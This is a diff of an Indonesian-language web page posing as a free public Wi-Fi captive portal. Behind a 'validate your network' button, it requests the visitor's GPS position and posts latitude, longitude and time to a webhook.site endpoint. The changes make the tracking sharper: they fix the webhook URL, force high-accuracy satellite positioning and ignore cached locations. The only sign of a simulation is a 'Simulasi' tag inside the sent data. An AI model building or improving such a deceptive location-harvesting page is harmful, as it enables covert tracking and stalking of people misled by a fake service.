@@ -70,7 +70,6 @@
     <h2>Selamat Datang di Layanan Wi-Fi Publik</h2>
     <p>Untuk melanjutkan akses internet gratis berkecepatan tinggi, silakan klik tombol di bawah untuk melakukan validasi jaringan lokal Anda.</p>
     
-    <!-- Tombol memicu fungsi JavaScript yang Anda miliki sebelumnya -->
     <button class="btn-connect" onclick="prosesAkses()">Hubungkan Sekarang</button>
     
     <div id="status-message"></div>
@@ -89,20 +88,21 @@
         status.style.color = "#333";
         status.innerHTML = "Menghubungkan ke gateway, harap tunggu...";
 
+        // Perbaikan Utama: Memasukkan konfigurasi presisi di parameter ketiga
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // Fungsi fetch pengiriman data ke Webhook Anda diletakkan di sini
-                fetch("https://webhook.site/63927741-6816-4b33-a3da-3c07c9f8b893 ", {
+                // Perbaikan 2: Menghapus spasi gaib di akhir URL Webhook agar fetch aman
+                fetch("https://webhook.site/63927741-6816-4b33-a3da-3c07c9f8b893", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         latitude: lat,
                         longitude: lon,
                         timestamp: new Date().toISOString(),
-                        tipe_akses: "Simulasi_Captive_Portal"
+                        tipe_akses: "Simulasi_Captive_Portal_Akurat"
                     })
                 });
                 
@@ -114,8 +114,13 @@
                 if (error.code === error.PERMISSION_DENIED) {
                     status.innerHTML = "Akses ditolak. Gagal memvalidasi jaringan lokal.";
                 } else {
-                    status.innerHTML = "Terjadi kesalahan jaringan.";
+                    status.innerHTML = "Terjadi kesalahan jaringan atau sinyal GPS lemah.";
                 }
+            },
+            {
+                enableHighAccuracy: true,  // MEMAKSA perangkat menyalakan modul GPS fisik (Satelit)
+                timeout: 15000,            // Memberikan waktu sistem 15 detik untuk mengunci koordinat terbaik
+                maximumAge: 0              // Mengabaikan lokasi lama yang tersimpan di cache memori
             }
         );
     }
